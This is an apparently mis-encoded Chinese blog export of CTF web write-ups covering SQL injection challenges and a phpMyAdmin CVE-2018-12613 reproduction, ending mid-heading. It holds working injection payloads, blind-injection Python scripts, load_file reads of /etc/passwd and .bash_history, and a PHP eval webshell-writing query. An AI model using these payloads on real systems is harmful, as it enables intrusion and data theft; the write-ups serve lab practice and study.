æ–¹å¼2è¿™ç§æ€è·¯ç®—æ˜¯éªšå¥—è·¯äº† é¢˜ç›®ç¯å¢ƒç”¨çš„æ•°æ®åº“å’Œflagæ‰€åœ¨çš„æ•°æ®åº“ä¸€æ ·ï¼Œéƒ½æ˜¯supersqliï¼Œåªä¸è¿‡ä¸¤ä¸ªè¡¨ä¸åŒï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥æ”¹ä¸‹è¡¨çš„åå­—ï¼Œå…ˆçœ‹ä¸‹è¡¨çš„ç»“æ„ 121&#x27;;use supersqli;show tables;show columns from `1919810931114514`;#1&#x27;;use supersqli;show tables;show columns from words;# å‘ç°æ•°å­—è¡¨åªæœ‰flagè¿™ä¸€åˆ—ï¼Œè€Œé¢˜ç›®æ‰€ä½¿ç”¨çš„è¡¨æœ‰id,dataä¸¤åˆ—ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥å¾€æ•°å­—è¡¨é‡Œæ’å…¥ä¸€ä¸ªåä¸ºidçš„åˆ—ï¼Œç„¶åå°†flagåˆ—é‡æ–°å‘½åä¸ºdataï¼Œå†å°†æ•°å­—è¡¨åæ”¹ä¸ºwordsï¼ŒæŠŠwordsè¡¨æ”¹æˆå…¶å®ƒåç§°ï¼Œpayload: 11&#x27;;RENAME TABLE `words` TO `test666`;RENAME TABLE `1919810931114514` TO `words`;ALTER TABLE `words` ADD COLUMN id INT(11);# æ³¨æ„æ•°å­—è¡¨è¦åŠ åå¼•å·ï¼Œidå› ä¸ºæ˜¯åˆšæ’å…¥çš„ï¼Œåº”è¯¥ä¸ºç©ºï¼Œæ‰€ä»¥éœ€è¦åŠ ä¸ªor 1=1# [SUCTF 2019]EasySQLwriteupåŒæ ·æ˜¯å †å æ³¨å…¥ï¼ŒæŒ‰ç…§ä»¥å‰çš„æ€è·¯å‘ç°èƒ½æ³¨å‡ºæ•°æ®åº“ä¸ºctfï¼Œè¡¨ä¸ºFlagï¼Œå­—æ®µå°±æ²¡åŠæ³•äº† ä¸ç»•å¼¯å­ï¼Œåå°sqlè¯­å¥ï¼š 1select $_POST[&#x27;query&#x27;]||flag from Flag è§£é¢˜payload: 11;set sql_mode&#x3D;PIPES_AS_CONCAT;select 1 ç›¸å½“äºæ‰§è¡Œï¼š 1select 1;set sql_mode=PIPES_AS_CONCAT;select 1||flag from Flag sql_modesql_modeï¼šæ˜¯ä¸€ç»„mysqlæ”¯æŒçš„åŸºæœ¬è¯­æ³•åŠæ ¡éªŒè§„åˆ™ï¼ŒPIPES_AS_CONCATï¼šå°†â€œ||â€è§†ä¸ºå­—ç¬¦ä¸²çš„è¿æ¥æ“ä½œç¬¦è€Œéæˆ–è¿ç®—ç¬¦ï¼Œè¿™å’ŒOracleæ•°æ®åº“æ˜¯ä¸€æ ·çš„ï¼Œä¹Ÿå’Œå­—ç¬¦ä¸²çš„æ‹¼æ¥å‡½æ•°Concatç›¸ç±»ä¼¼ è¿˜æœ‰ä¸ªpayload: 1*,1 ç›¸å½“äºæ‰§è¡Œ: 1select *,1||flag from Flag [CISCN2019 ååŒ—èµ›åŒº Day2 Web1]Hack Worldwriteupæ‰“å¼€é¢˜ç›®æç¤ºflagåœ¨flagè¡¨flagå­—æ®µé‡Œï¼Œboolç›²æ³¨ï¼Œexp: 12345678910111213141516171819202122232425262728import requestsurl=&quot;http://fea4ab1f-7bf4-452f-9c2a-83dadf6f6315.node3.buuoj.cn&quot;flag=&#x27;&#x27;for i in range(1,50): f1=flag top=127 low=33 while low&lt;=top: mid=(top+low)//2 data=&#123;&#x27;id&#x27;:&#x27;if(ascii(substr((select(flag)from(flag)),&#123;&#125;,1))&gt;&#123;&#125;,1,0)&#x27;.format(str(i),str(mid))&#125; data1=&#123;&#x27;id&#x27;:&#x27;if(ascii(substr((select(flag)from(flag)),&#123;&#125;,1))=&#123;&#125;,1,0)&#x27;.format(str(i),str(mid))&#125; try: r1=requests.post(url,data=data1) print(i,mid) if &#x27;glzjin&#x27; in r1.text: flag+=chr(mid) print(flag) break r=requests.post(url,data=data) if &quot;Error&quot; in r.text: top=mid-1 if &#x27;glzjin&#x27; in r.text: low=mid+1 except Exception as e: pass if flag==f1: break è¿˜æœ‰ç§payloadï¼š 1id&#x3D;1^(if(ascii(substr((select(flag)from(flag)),1,1))&#x3D;100,1,0)) [ç½‘é¼æ¯ 2018]Fakebookwriteupæ‰«ç›®å½•ï¼Œå‘ç°flag.phpå’Œrobots.txtï¼Œè®¿é—®çœ‹åˆ°user.php.bakï¼Œå¾—åˆ° 123456789101112131415161718192021222324252627282930313233343536&lt;?phpclass UserInfo&#123; public $name = &quot;&quot;; public $age = 0; public $blog = &quot;&quot;; public function __construct($name, $age, $blog) &#123; $this-&gt;name = $name; $this-&gt;age = (int)$age; $this-&gt;blog = $blog; &#125; function get($url) &#123; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $output = curl_exec($ch); $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE); if($httpCode == 404) &#123; return 404; &#125; curl_close($ch); return $output; &#125; public function getBlogContents () &#123; return $this-&gt;get($this-&gt;blog); &#125; public function isValidBlog () &#123; $blog = $this-&gt;blog; return preg_match(&quot;/^(((http(s?))\\:\\/\\/)?)([0-9a-zA-Z\\-]+\\.)+[a-zA-Z]&#123;2,6&#125;(\\:[0-9]+)?(\\/\\S*)?$/i&quot;, $blog); &#125;&#125; éšä¾¿æ³¨å†Œä¸ªè´¦å·è¿›å»ï¼Œåœ¨view.php?no=å‘ç°å­˜åœ¨æ³¨å…¥ order by åˆ¤æ–­å‡ºæœ‰å››åˆ—ï¼Œè¯•äº†è¯•è”åˆæŸ¥è¯¢ï¼Œå‘ç°ç›´æ¥union selectè¢«wafæ‹¦äº† å°è¯• union/**/selectå‘ç°å¯ä»¥æˆåŠŸç»•è¿‡ï¼Œåˆ¤æ–­å›æ˜¾ä½ï¼Œå‘ç°æ˜¯ç¬¬äºŒä½ æ¥ç€å°±æ˜¯çˆ†æ•°æ®åº“ï¼Œè¡¨ï¼Œåˆ— 1234567view.php?no=-1 union/**/select 1,group_concat(schema_name),3,4 from information_schema.schemata%23# å¾—åˆ°fakebook,information_schema,mysql,performance_schema,testview.php?no=-1 union/**/select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=database()%23# å¾—åˆ°usersview.php?no=-1 union/**/select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=database()%23# å¾—åˆ°no,username,passwd,data view.php?no=-1 union/**/select 1,concat(no,&#x27; &#x27;,username,&#x27; &#x27;,passwd,&#x27; &#x27;,data),3,4 from fakebook.users where no=1%23 å‘ç°ç”¨16è¿›åˆ¶åˆ†å‰²çš„æ—¶å€™ä¼šè¢«wafæ‹¦ï¼Œç›´æ¥ç”¨ç©ºæ ¼å­—ç¬¦ä¸² å‘ç°æœ€åä¸€åˆ—çš„å€¼æ˜¯åºåˆ—åŒ–çš„ç»“æœï¼Œåº”è¯¥å’Œå‰é¢çš„æºç æ³„éœ²æœ‰å…³ æ³¨å…¥è¿™é‡Œä¹Ÿå¯ä»¥ç”¨æŠ¥é”™æ³¨å…¥ 1234567view.php?no=-1 and extractvalue(1,concat(1,database()))%23view.php?no=-1 and extractvalue(1,concat(1,(select group_concat(table_name) from information_schema.tables where table_schema=database())))%23view.php?no=-1 and extractvalue(1,concat(1,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;)))%23view.php?no=-1 and extractvalue(1,concat(1,(select group_concat(data) from fakebook.users where no=1)))%23 åœ¨çˆ†å†…å®¹çš„æ—¶å€™å‘ç°ä¸å…¨ï¼Œè¿™æ˜¯å› ä¸ºæŠ¥é”™æ³¨å…¥é•¿åº¦é™åˆ¶ï¼Œé»˜è®¤ä¸º32ä¸ªå­—ç¬¦ï¼Œæˆ‘ä»¬å…ˆç”¨lengthçˆ†ä¸€ä¸‹é•¿åº¦ï¼Œå†ç”¨left,right,reverseæ¥çœ‹åˆ°å…¨éƒ¨å†…å®¹ çœ‹å…¶ä»–å¤§ä½¬çš„æ“ä½œï¼Œè¿˜å¯ä»¥ç”¨make_setå‡½æ•°ï¼Œä¹‹å‰æ²¡ç”¨è¿‡ï¼Œè¿™é‡Œè®°ä¸€ä¸‹ 12view.php?no=1 and updatexml(1,make_set(3,&#x27;~&#x27;,(select group_concat(table_name) from information_schema.tables where table_schema=database())),1)## å›æ˜¾å‰ä¸¤åˆ— è¯¦ç»†å¯ä»¥çœ‹ï¼šhttps://blog.csdn.net/qq_41725312/article/details/83039525 é¢˜ç›®å¯ä»¥ç›´æ¥load_fileè¯»æ–‡ä»¶ 1view.php?no=-1 union/**/select 1,load_file(&#x27;/var/www/html/index.php&#x27;),3,4%23 ç›´æ¥è¯»flag.phpå¯ä»¥å¾—åˆ°flag è¯»index.phpå‘ç°å­˜åœ¨ååºåˆ—åŒ– 123456789101112&lt;?phpforeach ($db-&gt;getAllUsers() as $user)&#123;$data = unserialize($user[&#x27;data&#x27;]);echo &quot;&lt;tr&gt;&quot;;echo &quot;&lt;td&gt;&#123;$user[&#x27;no&#x27;]&#125;&lt;/td&gt;&quot;;echo &quot;&lt;td&gt;&lt;a href=&#x27;view.php?no=&#123;$user[&#x27;no&#x27;]&#125;&#x27;&gt;&#123;$user[&#x27;username&#x27;]&#125;&lt;/a&gt;&lt;/td&gt;&quot;;echo &quot;&lt;td&gt;&#123;$data-&gt;age&#125;&lt;/td&gt;&quot;;echo &quot;&lt;td&gt;&#123;$data-&gt;blog&#125;&lt;/td&gt;&quot;;echo &quot;&lt;/tr&gt;\\n&quot;;&#125;?&gt; æ¥ç€æˆ‘ä»¬åˆåœ¨view.phpå‘ç°å­˜åœ¨å’Œä¸Šé¢ä¸€æ ·çš„ååºåˆ—åŒ–ï¼Œå¹¶è°ƒç”¨äº†userç±»é‡Œçš„getBlogContentsæ–¹æ³•ï¼š 12345678910111213141516171819202122232425&lt;?php$no = $_GET[&#x27;no&#x27;];if ($db-&gt;anti_sqli($no))&#123; die(&quot;no hack ~_~&quot;);&#125;$res = $db-&gt;getUserByNo($no);$user = unserialize($res[&#x27;data&#x27;]);//print_r($res);?&gt; &lt;?php$response = $user-&gt;getBlogContents();if ($response === 404)&#123;echo &quot;404 Not found&quot;;&#125;else&#123;$base64 = base64_encode($response);echo &quot;&lt;iframe width=&#x27;100%&#x27; height=&#x27;10em&#x27; src=&#x27;data:text/html;base64,&#123;$base64&#125;&#x27;&gt;&quot;;// echo $response;&#125;// var_dump($user-&gt;getBlogContents());?&gt; æ‹ä¸‹æ€è·¯ï¼Œindex.phpä¼šè·å–æ‰€æœ‰ç”¨æˆ·ï¼Œå¹¶æŠŠæ•°æ®åº“ä¸­dataå­—æ®µååºåˆ—åŒ–ï¼Œview.phpä¼šè®¿é—®ä¹‹å‰ç•™çš„blogé“¾æ¥çš„å†…å®¹ï¼Œè€Œåœ¨index.phpé‚£é‡Œå­˜åœ¨æ­£åˆ™è¿‡æ»¤ï¼Œæˆ‘ä»¬æ— æ³•åœ¨blogæ’å…¥file://åè®®è¯»æºç çš„ä»£ç ï¼Œä½†åœ¨view.phpå¹¶ä¸å­˜åœ¨è¿‡æ»¤ï¼Œå¹¶ä¸”æ­¤å¤„å­˜åœ¨sqlæ³¨å…¥ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç›´æ¥unionä¸€ä¸ªå‡çš„ç”¨æˆ·,dataåœ¨ç¬¬å››ä¸ªå­—æ®µä¸Š exp: 12345678&lt;?phpclass UserInfo&#123; public $name = &quot;&quot;; public $age = 0; public $blog = &quot;file:///var/www/html/flag.php&quot;;&#125;echo serialize(new UserInfo()); è¯·æ±‚å¸¦ä¸Šï¼Œæ³¨æ„åºåˆ—åŒ–å­—ç¬¦ä¸²è¦åŠ ä¸Šå¼•å· 1view.php?no=-1 union/**/select 1,2,3,&#x27;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:0:&quot;&quot;;s:3:&quot;age&quot;;i:0;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&#x27;%23 æŸ¥çœ‹æºä»£ç ï¼Œç‚¹dataåè®®å°±è¡Œ [ç½‘é¼æ¯ 2018]Commentwriteupæ‰«ç›®å½•ï¼Œå‘ç°gitæºç æ³„éœ²ï¼Œgit_extractæ¢å¤ï¼Œå¾—åˆ°write_do.php 123456789101112131415161718192021222324252627282930313233343536373839404142434445&lt;?phpinclude &quot;mysql.php&quot;;session_start();if($_SESSION[&#x27;login&#x27;] != &#x27;yes&#x27;)&#123; header(&quot;Location: ./login.php&quot;); die();&#125;if(isset($_GET[&#x27;do&#x27;]))&#123;switch ($_GET[&#x27;do&#x27;])&#123;case &#x27;write&#x27;: $category = addslashes($_POST[&#x27;category&#x27;]); $title = addslashes($_POST[&#x27;title&#x27;]); $content = addslashes($_POST[&#x27;content&#x27;]); $sql = &quot;insert into board set category = &#x27;$category&#x27;, title = &#x27;$title&#x27;, content = &#x27;$content&#x27;&quot;; $result = mysql_query($sql); header(&quot;Location: ./index.php&quot;); break;case &#x27;comment&#x27;: $bo_id = addslashes($_POST[&#x27;bo_id&#x27;]); $sql = &quot;select category from board where id=&#x27;$bo_id&#x27;&quot;; $result = mysql_query($sql); $num = mysql_num_rows($result); if($num&gt;0)&#123; $category = mysql_fetch_array($result)[&#x27;category&#x27;]; $content = addslashes($_POST[&#x27;content&#x27;]); $sql = &quot;insert into comment set category = &#x27;$category&#x27;, content = &#x27;$content&#x27;, bo_id = &#x27;$bo_id&#x27;&quot;; $result = mysql_query($sql); &#125; header(&quot;Location: ./comment.php?id=$bo_id&quot;); break;default: header(&quot;Location: ./index.php&quot;);&#125;&#125;else&#123; header(&quot;Location: ./index.php&quot;);&#125;?&gt; login.phpçˆ†ç ´å¼±å£ä»¤ï¼Œå¯†ç ä¸ºzhangwei666 addslashes()å‡½æ•°ï¼š é¢˜ç›®è€ƒå¯Ÿçš„æ˜¯äºŒæ¬¡æ³¨å…¥ï¼Œå³å…ˆå‘æ•°æ®åº“æ’å…¥é—­åˆè¯­å¥ï¼Œç„¶åå†åœ¨æŸ¥è¯¢æ—¶å–å‡ºæ¥ï¼Œè¾¾åˆ°ç»•è¿‡addslashes()å‡½æ•°çš„ä½œç”¨ ä»ä¸Šé¢çš„ä»£ç å¯ä»¥çœ‹åˆ°writeé‚£å—æ˜¯æ’å…¥å¸–å­ä¿¡æ¯åˆ°æ•°æ®åº“ï¼Œè€Œcommenté‚£å—æ˜¯æŠŠè¯„è®ºå¹¶å­˜åˆ°æ•°æ®åº“é‡Œï¼Œå¹¶ä¸”è¿™å—æ ¹æ®idå€¼å–å‡ºäº†å¸–å­categoryå‚æ•°çš„å†…å®¹ï¼Œå¹¶æ’å…¥æ•°æ®åº“ï¼Œæ‰€ä»¥ï¼Œç°åœ¨æ€è·¯å¾ˆæ˜ç¡®ï¼Œå…ˆå‘ä¸€ä¸ªå¸–å­ï¼Œåœ¨categoryé‡Œå†™å…¥&#39;é—­åˆ æ­¤æ—¶æ‰§è¡Œçš„sqlè¯­å¥ 1234insert into board set category = &#x27;\\&#x27;,content=database(),/*&#x27;, title = &#x27;aaaaaaa&#x27;, content = &#x27;adsd&#x27; ç”±äºè½¬ä¹‰ï¼Œæ’å…¥åˆ°æ•°æ®åº“çš„å†…å®¹categoryå­—æ®µå€¼ä¸º&#39;,content=database(),/* æ¥ç€æˆ‘ä»¬å† æ­¤æ—¶æ‰§è¡Œæ’å…¥æ“ä½œçš„sqlè¯­å¥ 1234insert into comment set category = &#x27;&#x27;,content=database(),/*&#x27;, content = &#x27;*/#&#x27;, bo_id = &#x27;9&#x27; å°±æˆåŠŸæŠŠdatabase()ä½œä¸ºcontentå­—æ®µçš„å†…å®¹æ’å…¥ æŒ‰ç…§è¿™ç§æ€è·¯load_fileè¯»å–æ–‡ä»¶/etc/passwd 1&#x27;,content=(select(load_file(&quot;/etc/passwd&quot;))),/* çœ‹åˆ°/home/wwwä»¥bashè¿è¡Œï¼Œè¯»ä¸€ä¸‹/home/www/.bash_history 1&#x27;,content=(select(load_file(&quot;/home/www/.bash_history&quot;))),/* çœ‹å‘½ä»¤å¯ä»¥çŒœæµ‹å†/tmp/html/.DS_Storeæ–‡ä»¶ï¼Œç›´æ¥è¯»ä¼šè¯»ä¸å…¨ï¼Œç”¨hexç¼–ç  1&#x27;,content=(select hex(load_file(&quot;/tmp/html/.DS_Store&quot;))),/* è®¿é—®ä¸€ä¸‹ï¼Œç¡®å®æœ‰ï¼Œè¯»ä¸€ä¸‹flag_8946e1ff1ee3e40f.phpæ–‡ä»¶ 1&#x27;,content=(select load_file(&quot;/var/www/html/flag_8946e1ff1ee3e40f.php&quot;)),/* å¾—åˆ°flag [ç½‘é¼æ¯2018]Unfinishwriteupæ‰“å¼€è·³è½¬åˆ°login.phpï¼Œä¸çŸ¥é“ä¸ºå•¥æ‰«ç›®å½•æ‰«ä¸åˆ°register.php,å¯èƒ½æ˜¯buuç¯å¢ƒçš„é—®é¢˜å§ å…ˆåœ¨login.phpè¯•äº†å¾ˆä¹…æ²¡æœ‰å•¥æ”¶è·ï¼Œå…ˆæ³¨å†Œä¸€ä¸ªè´¦å·å§ï¼Œç™»é™†å‘ç°é™¤äº†ç”¨æˆ·åå•¥éƒ½æ²¡æœ‰ï¼Œfuzzä¸€ä¸‹ï¼Œå‘ç°usernameå¤„æœ‰æ³¨å…¥ fuzzä¸€ä¸‹å‘ç°è¿‡æ»¤äº†,å’Œinformationï¼Œç”±äºé€—å·è¿‡æ»¤ 123if(1,1,0) &lt;==&gt; case when 1 then 1 else 0 endsubstr(database(),1,1) &lt;==&gt; substr(database() from 1 for 1)limt 9,4 &lt;==&gt; limit 9 offset 4 æµ‹è¯•ä¸Šé¢payloadå¯ç”¨ï¼Œå°±å¯ä»¥å†™è„šæœ¬äº†ï¼Œexp: 1234567891011121314151617181920212223242526272829303132333435363738import requestsurl=&quot;http://e2237b8f-0ea4-4294-bbe7-007af8f88f8b.node3.buuoj.cn/register.php&quot;flag=&#x27;&#x27;proxies=&#123; &quot;http&quot;:&quot;127.0.0.1:8080&quot;&#125;for i in range(1,50): f1=flag top=127 low=33 while low&lt;=top: mid=(top+low)//2 p1=&quot;aaaaa&#x27; || (case when ascii(substr((select*from flag) from &#123;&#125; for 1))&gt;&#123;&#125; then sleep(3) else 0 end) || &#x27;aaa&quot;.format(i,mid) p2=&quot;aaaaa&#x27; || (case when ascii(substr((select*from flag) from &#123;&#125; for 1))=&#123;&#125; then sleep(3) else 0 end) || &#x27;aaa&quot;.format(i,mid) data1=&#123;&#x27;email&#x27;:&#x27;basb@qq.com&#x27;,&#x27;username&#x27;:p1,&#x27;password&#x27;:&#x27;1234&#x27;&#125; data2=&#123;&#x27;email&#x27;:&#x27;basb@qq.com&#x27;,&#x27;username&#x27;:p2,&#x27;password&#x27;:&#x27;1234&#x27;&#125; try: print(i,mid) r1=requests.post(url,data=data2,timeout=3,proxies=proxies) except requests.exceptions.ReadTimeout as e: flag+=chr(mid) print(flag) break except Exception as e: pass else: try: r2=requests.post(url,data=data1,timeout=3,proxies=proxies) except requests.exceptions.ReadTimeout as e: low=mid+1 except Exception as e: pass else: top=mid-1 if flag==f1: break [SWPU2019]Web1writeupå¹¿å‘Šå¤„äºŒæ¬¡æ³¨å…¥,è¿‡æ»¤äº†ç©ºæ ¼ï¼Œå…ˆåˆ¤æ–­åˆ—æ•°ï¼Œä¸€ä¸ªä¸€ä¸ªè¯•å‘ç°æœ‰22åˆ—ï¼Œåˆ¤æ–­å›æ˜¾ä½å‘ç°ï¼š 1test&#x27;/**/UNION/**/SELECT/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#x27; å›æ˜¾ä½ä¸º2,3ä½ 1test1&#x27;/**/UNION/**/SELECT/**/1,database(),(select/**/concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#x27; ç›´æ¥ç”¨å‘ç°ä¼šè¢«æ‹¦ï¼Œè¿‡æ»¤äº†information_schemaï¼Œbypasså‚è€ƒ: https://www.anquanke.com/post/id/193512 å¯ä»¥æ— åˆ—åæ³¨å…¥ç»•è¿‡ï¼Œå…ˆçŒœä¸€ä¸‹è¡¨åï¼š 1test2&#x27;/**/UNION/**/SELECT/**/1,2,(select/**/count(*)/**/from/**/users),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#x27; ä¸‰æ¡ï¼Œè¯´æ˜å­˜åœ¨è¯¥è¡¨ 1test3&#x27;/**/UNION/**/SELECT/**/1,2,(select/**/group_concat(a)/**/from/**/(select/**/1,2/**/as/**/a,3/**/as/**/b/**/from/**/users/**/union/**/select*from/**/users)c),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#x27; æ³¨flagå†…å®¹ 1test4&#x27;/**/UNION/**/SELECT/**/1,2,(select/**/group_concat(b)/**/from/**/(select/**/1,2/**/as/**/a,3/**/as/**/b/**/from/**/users/**/union/**/select*from/**/users)c),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#x27;","categories":[],"tags":[{"name":"web","slug":"web","permalink":"http://www.m00nback.xyz/tags/web/"},{"name":"buuctf","slug":"buuctf","permalink":"http://www.m00nback.xyz/tags/buuctf/"},{"name":"sqlæ³¨å…¥","slug":"sqlæ³¨å…¥","permalink":"http://www.m00nback.xyz/tags/sql%E6%B3%A8%E5%85%A5/"}]},{"title":"buuctfåˆ·é¢˜-ä»£ç å®¡è®¡ç¯‡","slug":"buuctfåˆ·é¢˜-ä»£ç å®¡è®¡ç¯‡","date":"2020-01-12T12:16:57.000Z","updated":"2020-08-22T04:41:07.254Z","comments":true,"path":"2020/01/12/buuctfåˆ·é¢˜-ä»£ç å®¡è®¡ç¯‡/","link":"","permalink":"http://www.m00nback.xyz/2020/01/12/buuctf%E5%88%B7%E9%A2%98-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%AF%87/","excerpt":"æœ¬ç¯‡åšå®¢ä¸»è¦ä»‹ç»äº†buuctf webéƒ¨åˆ†ä»£ç å®¡è®¡é¢˜ç›®çš„wpï¼æŒç»­æ›´æ–°ï¼","text":"æœ¬ç¯‡åšå®¢ä¸»è¦ä»‹ç»äº†buuctf webéƒ¨åˆ†ä»£ç å®¡è®¡é¢˜ç›®çš„wpï¼æŒç»­æ›´æ–°ï¼ [HCTF 2018]WarmUpwriteupæ‰“å¼€é¢˜ç›®ï¼ŒæŸ¥çœ‹æºä»£ç å‘ç°source.php,å¾—åˆ°æºä»£ç ï¼Œä»£ç å®¡è®¡ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849 &lt;?php highlight_file(__FILE__); class emmm &#123; public static function checkFile(&amp;$page) &#123; $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;]; if (! isset($page) || !is_string($page)) &#123; echo &quot;you can&#x27;t see it&quot;; return false; &#125; if (in_array($page, $whitelist)) &#123; return true; &#125; $_page = mb_substr( $page, 0, mb_strpos($page . &#x27;?&#x27;, &#x27;?&#x27;) ); if (in_array($_page, $whitelist)) &#123; return true; &#125; $_page = urldecode($page); $_page = mb_substr( $_page, 0, mb_strpos($_page . &#x27;?&#x27;, &#x27;?&#x27;) ); if (in_array($_page, $whitelist)) &#123; return true; &#125; echo &quot;you can&#x27;t see it&quot;; return false; &#125; &#125; if (! empty($_REQUEST[&#x27;file&#x27;]) &amp;&amp; is_string($_REQUEST[&#x27;file&#x27;]) &amp;&amp; emmm::checkFile($_REQUEST[&#x27;file&#x27;]) ) &#123; include $_REQUEST[&#x27;file&#x27;]; exit; &#125; else &#123; echo &quot;&lt;br&gt;&lt;img src=\\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\&quot; /&gt;&quot;; &#125; ?&gt; ä»£ç çš„å¤§æ¦‚æ„æ€æ˜¯æ¥å—ä¸€ä¸ªfileçš„å‚æ•°ï¼Œé™åˆ¶å˜é‡ç±»å‹ä¸ºå­—ç¬¦ä¸²ï¼Œç™½åå•æ£€æŸ¥é€šè¿‡æ£€æŸ¥å°±åŒ…å« è¿™é¢˜çš„çªç ´ç‚¹å°±æ˜¯urlåŒé‡ç¼–ç ï¼Œä»hint.phpå¯çŸ¥flagåº”è¯¥åœ¨/ffffllllaaaaggggï¼Œpayload: 1?file=hint.php%25%33%66/../../../../ffffllllaaaagggg ?çš„urlç¼–ç æ˜¯%3fï¼ŒåŒé‡ç¼–ç æ˜¯%25%33%66ï¼Œåœ¨åŒ…å«çš„æ—¶å€™ä¼šè§£ææˆhint.php%3fè¿™ä¸ªç›®å½• è¿™é¢˜çš„åŸå‹æ˜¯phpmyadmin(CVE-2018-12613)åå°ä»»æ„æ–‡ä»¶åŒ…å«æ¼æ´ CVE-2018-12613å¤ç°æ¼æ´ç®€ä»‹æ­¤æ¼æ´å½±å“ç‰ˆæœ¬ï¼š4.8.0â€”â€”4.8.1 æ¼æ´çš„å…¥å£åœ¨index.php 54-63è¡Œ 1234567891011121314$target_blacklist = array ( &#x27;import.php&#x27;, &#x27;export.php&#x27;);// If we have a valid target, let&#x27;s load that script insteadif (! empty($_REQUEST[&#x27;target&#x27;]) &amp;&amp; is_string($_REQUEST[&#x27;target&#x27;]) &amp;&amp; ! preg_match(&#x27;/^index/&#x27;, $_REQUEST[&#x27;target&#x27;]) &amp;&amp; ! in_array($_REQUEST[&#x27;target&#x27;], $target_blacklist) &amp;&amp; Core::checkPageValidity($_REQUEST[&#x27;target&#x27;])) &#123; include $_REQUEST[&#x27;target&#x27;]; exit;&#125; è¿™é‡Œæœ‰5ä¸ªæ¡ä»¶ï¼Œæ»¡è¶³ä¹‹åå°±ä¼šåŒ…å«æˆ‘ä»¬ç©¿è¿‡æ¥çš„æ–‡ä»¶ã€‚å‰4ä¸ªæ¡ä»¶éƒ½æ¯”è¾ƒå¥½ç†è§£ï¼Œéç©ºã€å¿…é¡»ä¸ºå­—ç¬¦ä¸²ã€ä¸èƒ½æ˜¯indexå¼€å¤´ï¼Œä¸èƒ½æ˜¯é»‘åå•ä¸­çš„æ–‡ä»¶åï¼ˆimport.phpã€export.php)ï¼Œé‡ç‚¹çœ‹æœ€åä¸€ä¸ª,Coreç±»ä½äºlibraries/classes/Core.php 123456789101112131415161718192021222324252627282930public static function checkPageValidity(&amp;$page, array $whitelist = [])&#123; if (empty($whitelist)) &#123; $whitelist = self::$goto_whitelist; &#125; if (! isset($page) || !is_string($page)) &#123; return false; &#125; if (in_array($page, $whitelist)) &#123; return true; &#125; $_page = mb_substr( $page, 0, mb_strpos($page . &#x27;?&#x27;, &#x27;?&#x27;) ); //æŒ‰?åˆ†å‰²å­—ç¬¦ä¸²ï¼Œå–å‰åŠéƒ¨åˆ† if (in_array($_page, $whitelist)) &#123; return true; &#125; $_page = urldecode($page); $_page = mb_substr( $_page, 0, mb_strpos($_page . &#x27;?&#x27;, &#x27;?&#x27;) ); //æŒ‰?åˆ†å‰²å­—ç¬¦ä¸²ï¼Œå–å‰åŠéƒ¨åˆ† if (in_array($_page, $whitelist)) &#123; return true; &#125; return false;&#125; åŸºæœ¬ä¸Šå’Œé¢˜ç›®ä»£ç ä¸€æ ·ï¼Œç™½åå•æœ‰å¥½å¤šæ–‡ä»¶å¯ä»¥åˆ©ç”¨ è¿™é‡Œæ˜¯ç”¨çš„vulhubé¶åœºï¼Œé‡Œé¢æœ‰è¿™ä¸ªæ¼æ´çš„å¤ç°ç¯å¢ƒï¼Œç›´æ¥dockeræ­å»º æ„é€ payloadç±»ä¼¼äºä»¥ä¸‹å½¢å¼ï¼š 1index.php?target=db_sql.php%25%33%66/../../../../etc/passwd getshellæ–¹å¼1 åŒ…å«sessionå…ˆæ‰§è¡Œæ¡sqlè¯­å¥ 1SELECT &#x27;&lt;?php phpinfo();?&gt;&#x27;; æŸ¥çœ‹session_id åŒ…å«ï¼Œpayload: 1?target=db_sql.php%253f/../../../../../tmp/sess_d3455e637bcc0b69789190c6ffb4cd18 ä¸ªäººåœ¨linuxä¸Šæ­å»ºçš„ç¯å¢ƒå¥½åƒä¸èƒ½ç›´æ¥æ‰§è¡Œæœ‰ä¸€å¥è¯çš„sqlè¯­å¥ç„¶ååŒ…å«sessionæ¥getshell æœ€å¥½çš„æ–¹å¼è¿˜æ˜¯æ‰¾æœ‰å†™å…¥æƒé™çš„ç›®å½•å†™é©¬ 1SELECT &quot;&lt;?php file_put_contents(&#x27;moonback.php&#x27;,&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;);?&gt;&quot;; æ–¹å¼2 åŒ…å«æ•°æ®åº“æ–‡ä»¶åˆ›å»ºä¸€ä¸ªæ•°æ®è¡¨ï¼Œé‡Œé¢æ’å…¥ä¸€å¥è¯ æŸ¥è¯¢ä¸€ä¸‹è¯¥è¡¨çš„è·¯å¾„ 1show global variables like &#x27;%datadir%&#x27;; ç„¶åç›´æ¥åŒ…å«å°±è¡Œï¼Œpayloadï¼š 1index.php?target=db_sql.php%253f/../../../../../var/lib/mysql/test/shell.frm åœ¨linuxä¸Šå°è¯•æ²¡åŒ…å«æˆåŠŸï¼ŒçŒœæµ‹å¯èƒ½æ˜¯æƒé™é—®é¢˜ [GWCTF 